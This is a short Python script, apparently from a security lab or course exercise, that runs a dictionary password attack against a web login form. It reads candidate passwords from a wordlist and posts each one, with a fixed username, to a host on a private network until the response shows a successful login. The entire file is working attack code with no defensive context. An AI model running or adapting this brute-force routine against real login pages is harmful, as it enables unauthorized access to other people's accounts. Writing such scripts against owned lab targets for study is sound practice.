import requests
def main():
    with open("../Q2dictionary.txt", "r") as f:
        passwords = f.read().splitlines()
    successful_login = False
    for password in passwords:
        params = {
            "username": "V_Pamelia191",
            "password": password,
            "submit": "submit"
        }
        try:
            r = requests.post("http://10.13.4.80:80", data=params)
        except requests.RequestException as e:
            print(f"Request error: {e}")
            continue
        if "User login" in r.text:
            print(f"Successfully logged in using: {password}")
            successful_login = True
            break
    if not successful_login:
        print("Could not find valid password")
if __name__ == "__main__":
    main()

